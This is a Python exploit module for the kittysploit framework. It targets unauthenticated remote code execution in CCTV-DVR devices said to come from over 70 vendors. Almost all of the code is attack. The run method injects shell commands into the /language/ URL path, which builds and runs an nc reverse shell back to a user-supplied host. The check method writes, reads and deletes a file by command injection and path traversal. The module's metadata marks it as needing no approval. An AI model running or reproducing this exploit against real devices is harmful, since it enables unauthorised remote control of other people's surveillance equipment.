#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple CCTV-DVR Vendors"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Multiple CCTV-DVR Vendors',
        'description': 'Remote Code Execution in CCTV-DVR affecting over 70 different vendors',
        'author': ['k1p0d', 'GH0st3rs'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/39596/', 'http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html'],
        'tags': ['iot', 'camera', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    connback = OptString("", "Local ip:port for reverse connect e.g. 192.168.1.100:55555")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            pattern = re.compile(r'(?P<host>[a-zA-Z0-9\.\-]+):(?P<port>[0-9]+)')
            match = pattern.search(self.connback)
            if not match:
                print_error('given connect back "{local}" should be in the format for host:port'.format(local=self.connback))
                return False
            # Three ..
            response = self.http_request(
                method="GET",
                path="/language/Swedish${IFS}&&echo${IFS}nc${IFS}%s${IFS}%s${IFS}>e&&${IFS}/a" % (
                    match.group("host"),
                    match.group("port")
                )
            )
            if response is None:
                print_error("Exploit failed - unable to connect reason")
                return False
            # Two ...
            response = self.http_request(
                method="GET",
                path='/language/Swedish${IFS}&&echo${IFS}" - e${IFS}$SHELL${IFS}">>e&&${IFS}/a'
            )
            if response is None:
                print_error("Exploit failed - unable to connect reason")
                return False
            # One. Left off!
            response = self.http_request(
                method="GET",
                path="/language/Swedish&&$(cat${IFS}e)${IFS}&>r&&${IFS}/s"
            )
            if response is None:
                print_error("Exploit failed - unable to connect reason")
                return False

            print_status("Exploit payload sent!")
            print_success("If nothing went wrong we should be getting a reversed remote shell at %s:%s" % (
                match.group("host"),
                match.group("port")
            ))
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        # Write file
        response = self.http_request(
            method="GET",
            path="/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js"
        )

        if response is None:
            return False

        # Lots of devices are redirecting. This triggers a false positive.
        if response.status_code == 307:
            return False

        # Read the file.
        response_read = self.http_request(
            method="GET",
            path="/../../../../../../../mnt/mtd/test"
        )
        if response_read is None:
            return False
        # remove it..
        response = self.http_request(
            method="GET",
            path="//language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js"
        )
        if response is None:
            return False
        if response_read.text and response_read.text[0] != '1':
            return False
        return True
